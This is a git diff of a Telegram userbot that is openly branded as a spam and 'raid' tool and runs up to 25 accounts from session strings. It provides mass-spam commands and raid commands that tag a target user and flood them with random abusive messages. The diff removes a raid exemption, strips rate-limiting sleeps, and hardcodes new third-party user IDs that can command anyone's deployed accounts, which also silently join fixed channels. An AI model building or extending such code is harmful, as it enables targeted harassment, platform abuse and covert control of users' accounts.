@@ -12,7 +12,7 @@ import telethon.utils
 from telethon.tl import functions
 from telethon.tl.functions.channels import LeaveChannelRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest
-from Utils import RAID, RRAID, MKX
+from Utils import RAID, RRAID
 from telethon.tl.functions.channels import JoinChannelRequest
 
 a = API_ID
@@ -73,7 +73,7 @@ put = ""
 
 que = {}
 
-SMEX_USERS = [2020051281, 2079359858, 2044073145]
+SMEX_USERS = [5269906172, 1511095236, 5228693030]
 for x in SUDO_USERS: 
     SMEX_USERS.append(x)
     
@@ -115,7 +115,7 @@ async def start_yukki():
             await idk(functions.channels.JoinChannelRequest(channel="@backbenchersOP1311"))
             await idk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             idk = "smex"
             print(e)
@@ -140,7 +140,7 @@ async def start_yukki():
             await ydk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await ydk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -165,7 +165,7 @@ async def start_yukki():
             await wdk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await wdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -190,7 +190,7 @@ async def start_yukki():
             await hdk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await hdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -215,7 +215,7 @@ async def start_yukki():
             await sdk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await sdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -240,7 +240,7 @@ async def start_yukki():
             await adk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await adk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -265,7 +265,7 @@ async def start_yukki():
             await bdk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await bdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -291,7 +291,7 @@ async def start_yukki():
             await cdk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await cdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -316,7 +316,7 @@ async def start_yukki():
             await ddk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await ddk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -342,7 +342,7 @@ async def start_yukki():
             await edk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await edk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -368,7 +368,7 @@ async def start_yukki():
             await vkk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await vkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -394,7 +394,7 @@ async def start_yukki():
             await kkk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await kkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -420,7 +420,7 @@ async def start_yukki():
             await lkk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await lkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -446,7 +446,7 @@ async def start_yukki():
             await mkk(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await mkk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -472,7 +472,7 @@ async def start_yukki():
             await sid(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botme = await sid.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -498,7 +498,7 @@ async def start_yukki():
             await shy(functions.channels.JoinChannelRequest(channel="@backbenchersOP1311"))
             await shy(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -522,7 +522,7 @@ async def start_yukki():
             await aan(functions.channels.JoinChannelRequest(channel="@backbenchersOP1311"))
             await aan(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -546,7 +546,7 @@ async def start_yukki():
             await ake(functions.channels.JoinChannelRequest(channel="@backbenchersOP1311"))
             await ake(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -570,7 +570,7 @@ async def start_yukki():
             await eel(functions.channels.JoinChannelRequest(channel="@backbenchersOP1311"))
             await eel(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -594,7 +594,7 @@ async def start_yukki():
             await khu(functions.channels.JoinChannelRequest(channel="@backbenchersOP1311"))
             await khu(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -618,7 +618,7 @@ async def start_yukki():
             await shi(functions.channels.JoinChannelRequest(channel="@backbenchersOP1311"))
             await shi(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -642,7 +642,7 @@ async def start_yukki():
             await yaa(functions.channels.JoinChannelRequest(channel="@backbenchersOP1311"))
             await yaa(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -666,7 +666,7 @@ async def start_yukki():
             await dav(functions.channels.JoinChannelRequest(channel="@backbenchersOP1311"))
             await dav(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -690,7 +690,7 @@ async def start_yukki():
             await raj(functions.channels.JoinChannelRequest(channel="@backbenchersOP1311"))
             await raj(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -708,13 +708,13 @@ async def start_yukki():
         print("String 25 Found")
         put = TelegramClient(StringSession(session_name), a, b)
         try:
-            print("Booting Up The Client 1")
+            print("Booting Up The Client 25")
             await put.start()
             botme = await put.get_me()
             await put(functions.channels.JoinChannelRequest(channel="@backbenchersOP1311"))
             await put(functions.channels.JoinChannelRequest(channel="@bestiesforestiess"))
             botid = telethon.utils.get_peer_id(botme)
-            SMEX_USERS.append(botid)
+            SMEX_USERS.append(int(botid))
         except Exception as e:
             print(e)
             pass
@@ -775,7 +775,7 @@ async def gifspam(e, smex):
 
 async def _(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
-    if e.sender_id in SMEX_USERS:
+    if int(e.sender_id) in SMEX_USERS:
         yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) > 6:
             bc = yukki[0]
@@ -819,7 +819,7 @@ async def _(e):
 
 async def _(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
-    if e.sender_id in SMEX_USERS:
+    if int(e.sender_id) in SMEX_USERS:
         yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) > 7:
             bc = yukki[0]
@@ -862,7 +862,7 @@ async def _(e):
 
 async def _(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
-    if e.sender_id in SMEX_USERS:
+    if int(e.sender_id) in SMEX_USERS:
         yukki = ("".leave(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) == 7:
             bc = yukki[0]
@@ -908,7 +908,7 @@ async def _(e):
 async def spam(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗦𝗽𝗮𝗺\n\nCommand:\n\n.spam <count> <message to spam>\n\n.spam <count> <reply to a message>\n\nCount must be a integer."
     error = "Spam Module can only be used till 100 count. For bigger spams use BigSpam."
-    if e.sender_id in SMEX_USERS:
+    if int(e.sender_id) in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None )
         yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
@@ -964,7 +964,7 @@ async def spam(e):
 
 async def spam(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗹𝗮𝘆𝗦𝗽𝗮𝗺\n\nCommand:\n\n.delayspam <sleep time> <count> <message to spam>\n\n.delayspam <sleep time> <count> <reply to a message>\n\nCount and Sleeptime must be a integer."
-    if e.sender_id in SMEX_USERS:
+    if int(e.sender_id) in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None )
         smex = await e.get_reply_message()
@@ -1029,7 +1029,7 @@ async def spam(e):
 
 async def spam(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗕𝗶𝗴𝗦𝗽𝗮𝗺\n\nCommand:\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
-    if e.sender_id in SMEX_USERS:
+    if int(e.sender_id) in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None )
         yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
@@ -1043,21 +1043,18 @@ async def spam(e):
                         await smex.reply(message)
                     else:
                         await e.client.send_message(e.chat_id, message)
-                    await asyncio.sleep(0.0)
         elif e.reply_to_msg_id and smex.media:  
             counter = int(yukki[0])
             for _ in range(counter):
                 async with e.client.action(e.chat_id, "document"):
                     smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
-                    await gifspam(e, smex) 
-                await asyncio.sleep(0.0)  
+                    await gifspam(e, smex)
         elif e.reply_to_msg_id and smex.text:
             message = smex.text
             counter = int(yukki[0])
             for _ in range(counter):
                 async with e.client.action(e.chat_id, "typing"):
                     await e.client.send_message(e.chat_id, message)
-                    await asyncio.sleep(0.0)
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
 
@@ -1090,7 +1087,7 @@ async def spam(e):
 
 async def spam(e):
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
-    if e.sender_id in SMEX_USERS:
+    if int(e.sender_id) in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None )
         yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
@@ -1100,34 +1097,26 @@ async def spam(e):
             print(message)
             a = await e.client.get_entity(message)
             g = a.id
-            if int(g) in MKX:
-                await e.client.send_message("I can't raid on BhaukaalBaba's owner")
-            else: 
-                c = a.first_name
-                username = f"[{c}](tg://user?id={g})"
-                counter = int(yukki[0])
-                for _ in range(counter):
-                    reply = random.choice(RAID)
-                    caption = f"{username} {reply}"
-                    async with e.client.action(e.chat_id, "typing"):
-                        await e.client.send_message(e.chat_id, caption)
-                        await asyncio.sleep(0.0)
+            c = a.first_name
+            username = f"[{c}](tg://user?id={g})"
+            counter = int(yukki[0])
+            for _ in range(counter):
+                reply = random.choice(RAID)
+                caption = f"{username} {reply}"
+                async with e.client.action(e.chat_id, "typing"):
+                    await e.client.send_message(e.chat_id, caption)
         elif e.reply_to_msg_id:             
             a = await e.get_reply_message()
             b = await e.client.get_entity(a.sender_id)
             g = b.id
-            if int(g) in MKX:
-                await e.client.send_message("I can't raid on BhaukaalBaba's owner")
-            else: 
-                c = b.first_name
-                counter = int(yukki[0])
-                username = f"[{c}](tg://user?id={g})"
-                for _ in range(counter):
-                    reply = random.choice(RAID)
-                    caption = f"{username} {reply}"
-                    async with e.client.action(e.chat_id, "typing"):
-                        await e.client.send_message(e.chat_id, caption)
-                        await asyncio.sleep(0.0)
+            c = b.first_name
+            counter = int(yukki[0])
+            username = f"[{c}](tg://user?id={g})"
+            for _ in range(counter):
+                reply = random.choice(RAID)
+                caption = f"{username} {reply}"
+                async with e.client.action(e.chat_id, "typing"):
+                    await e.client.send_message(e.chat_id, caption)
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
 
@@ -1161,14 +1150,11 @@ async def spam(e):
 @raj.on(events.NewMessage(incoming=True))
 @put.on(events.NewMessage(incoming=True))
 
-
 async def _(event):
     global que
     queue = que.get(event.sender_id)
     if not queue:
         return
-    async with event.client.action(event.chat_id, "typing"):
-        await asyncio.sleep(0.0)
     async with event.client.action(event.chat_id, "typing"):
         await event.client.send_message(
             entity=event.chat_id,
@@ -1207,7 +1193,7 @@ async def _(event):
 async def _(e):
     global que
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.replyraid <Username of User>\n\n.replyraid <reply to a User>"
-    if e.sender_id in SMEX_USERS:
+    if int(e.sender_id) in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None )
         yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
@@ -1216,28 +1202,22 @@ async def _(e):
             message = str(yukki[0])
             a = await e.client.get_entity(message)
             g = a.id
-            if int(g) in MKX:
-                await e.client.send_message("I can't raid on BhaukaalBaba's owner")
-            else: 
-                que[g] = []
-                qeue = que.get(g)
-                appendable = [g]
-                qeue.append(appendable)
-                text = "ᗩᗷᗷ ᗷᗩᗩᑭ ᒍᏆᏆ ᑕᕼᝪᗞᗴᏀᗩ ᎢᑌᏃᗴ ᗩᗩᒍᗩ ᗷᗴᎢᗩ ᗩᗷᗷ 🔥🥵"
-                await e.reply(text, parse_mode=None, link_preview=None )
+            que[g] = []
+            qeue = que.get(g)
+            appendable = [g]
+            qeue.append(appendable)
+            text = "ᗩᗷ ᗷᕼᗩᑌKᗩᗩᒪ ᗷᗩᗷᗩ Տᗴ ᑕᕼᑌᗪᗴᑎᘜᗴ Yᗴ ᗷᗩᑕᑕᕼᗴ 🔥🥵"
+            await e.reply(text, parse_mode=None, link_preview=None )
         elif e.reply_to_msg_id:             
             a = await e.get_reply_message()
             b = await e.client.get_entity(a.sender_id)
             g = b.id
-            if int(g) in MKX:
-                await e.client.send_message("I can't raid on BhaukaalBaba's owner")
-            else: 
-                que[g] = []
-                qeue = que.get(g)
-                appendable = [g]
-                qeue.append(appendable)
-                text = "ᗩᗷᗷ ᗷᗩᗩᑭ ᒍᏆᏆ ᑕᕼᝪᗞᗴᏀᗩ ᎢᑌᏃᗴ ᗩᗩᒍᗩ ᗷᗴᎢᗩ ᗩᗷᗷ 🔥🥵"
-                await e.reply(text, parse_mode=None, link_preview=None )
+            que[g] = []
+            qeue = que.get(g)
+            appendable = [g]
+            qeue.append(appendable)
+            text = "ᗩᗷ ᗷᕼᗩᑌKᗩᗩᒪ ᗷᗩᗷᗩ Տᗴ ᑕᕼᑌᗪᗴᑎᘜᗴ Yᗴ ᗷᗩᑕᑕᕼᗴ 🔥🥵"
+            await e.reply(text, parse_mode=None, link_preview=None )
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
 
@@ -1271,7 +1251,7 @@ async def _(e):
 async def _(e):
     global que
     usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.dreplyraid <Username of User>\n\n.dreplyraid <reply to a User>"
-    if e.sender_id in SMEX_USERS:
+    if int(e.sender_id) in SMEX_USERS:
         if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
             return await e.reply(usage, parse_mode=None, link_preview=None )
         yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
@@ -1285,7 +1265,7 @@ async def _(e):
                 queue.pop(0)
             except Exception as f:
                 pass
-            text = "ᒍᗩᗩ ᗷᔑᗞᏦ ᑕᕼᝪᖇ ᗞᏆᗩ 😂 😂💥"
+            text = "ᑕᕼᗩᒪO ᗷᗩᑕᑕᕼO ᗰᗩᗩᖴ KIYᗩ TᑌᗰKO 😂💥"
             await e.reply(text, parse_mode=None, link_preview=None )
         elif e.reply_to_msg_id:             
             a = await e.get_reply_message()
@@ -1296,7 +1276,7 @@ async def _(e):
                 queue.pop(0)
             except Exception as f:
                 pass
-            text = "ᒍᗩᗩ ᗷᔑᗞᏦ ᑕᕼᝪᖇ ᗞᏆᗩ 😂 😂💥"
+            text = "ᑕᕼᗩᒪO ᗷᗩᑕᑕᕼO ᗰᗩᗩᖴ KIYᗩ TᑌᗰKO 😂💥"
             await e.reply(text, parse_mode=None, link_preview=None )
         else:
             await e.reply(usage, parse_mode=None, link_preview=None )
@@ -1329,7 +1309,7 @@ async def _(e):
 @raj.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
 @put.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
 async def ping(e):
-    if e.sender_id in SMEX_USERS:
+    if int(e.sender_id) in SMEX_USERS:
         start = datetime.now()
         text = "Σ𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃㉺"
         event = await e.reply(text, parse_mode=None, link_preview=None)
@@ -1366,7 +1346,7 @@ async def ping(e):
 @raj.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
 @put.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
 async def restart(e):
-    if e.sender_id in SMEX_USERS:
+    if int(e.sender_id) in SMEX_USERS:
         text = "🇺 ᖴᖴ 🇩 OᖇᗴᗰOᑎ 🇰 I 🇬 ᗩᑎᗪ 🇩 ᗴKᕼ 🇰 ᗴ 🇦 Tᗩ 🇭 🇺 🤤"
         await e.reply(text, parse_mode=None, link_preview=None )
         try:
@@ -1409,11 +1389,69 @@ async def restart(e):
             await edk.disconnect()
         except Exception as e:
             pass
+        try:
+            await vkk.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await kkk.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await lkk.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await mkk.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await sid.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await shy.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await aan.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await ake.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await eel.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await khu.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await shi.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await yaa.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await dav.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await raj.disconnect()
+        except Exception as e:
+            pass
+        try:
+            await put.disconnect()
+        except Exception as e:
+            pass
         os.execl(sys.executable, sys.executable, *sys.argv)
         quit()
-
-        
-        
+   
         
         
         
@@ -1444,19 +1482,18 @@ async def restart(e):
 @put.on(events.NewMessage(incoming=True, pattern=r"\.help"))
 
 async def help(e):
-    if e.sender_id in SMEX_USERS:
-       text = " ⚔️ ᗷᕼᗩᑌKᗩᗩᒪ ᗷᗩᗷᗩ Տᑭᗩᗰ ⚔️\n\nᑌTIᒪ ᑕOᗰᗰᗩᑎᗪՏ:\n.ping\n.restart\n\nᑌՏᗴᖇᗷOT ᑕOᗰᗰᗩᑎᗪՏ:\n.bio\n.join\n.pjoin\n.leave\n\nՏᑭᗩᗰ ᑕOᗰᗰᗩᑎᗪՏ:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\nFor more help regarding usage of plugins type plugins name"
+    if int(e.sender_id) in SMEX_USERS:
+       text = "⚔️ ᗷᕼᗩᑌKᗩᗩᒪ ᗷᗩᗷᗩ Տᑭᗩᗰ ⚔️\n\nᑌTIᒪ ᑕOᗰᗰᗩᑎᗪՏ:\n.ping\n.restart\n\nᑌՏᗴᖇᗷOT ᑕOᗰᗰᗩᑎᗪՏ:\n.bio\n.join\n.pjoin\n.leave\n\nՏᑭᗩᗰ ᑕOᗰᗰᗩᑎᗪՏ:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\nFor more help regarding usage of plugins type plugins name"
        await e.reply(text, parse_mode=None, link_preview=None )
 
         
 
     
         
-text = """
-CONGRATS🥳🥳🥳 YOUR FASTEST, SMOOTHEST AND POWERFUL ᗷᕼᗩᑌKᗩᗩᒪ ᗷᗩᗷᗩ Տᑭᗩᗰ DEPLOYED SUCCESSFULLY """
-
+text = "CONGRATS🥳🥳🥳 YOUR FASTEST, SMOOTHEST AND POWERFUL ᗷᕼᗩᑌKᗩᗩᒪ ᗷᗩᗷᗩ Տᑭᗩᗰ DEPLOYED SUCCESSFULLY"
 print(text)
 print("YOᑌᖇ ᗷᕼᗩᑌKᗩᗩᒪ ᗷᗩᗷᗩ Տᑭᗩᗰ ᗷOT ᗪᗴᑭᒪOY !!")
+
 if len(sys.argv) not in (1, 3, 4):
     try:
         idk.disconnect()
@@ -1558,6 +1595,7 @@ if len(sys.argv) not in (1, 3, 4):
         put.disconnect()
     except Exception as e:
         pass
+
 else:
     try:
         idk.run_until_disconnected()
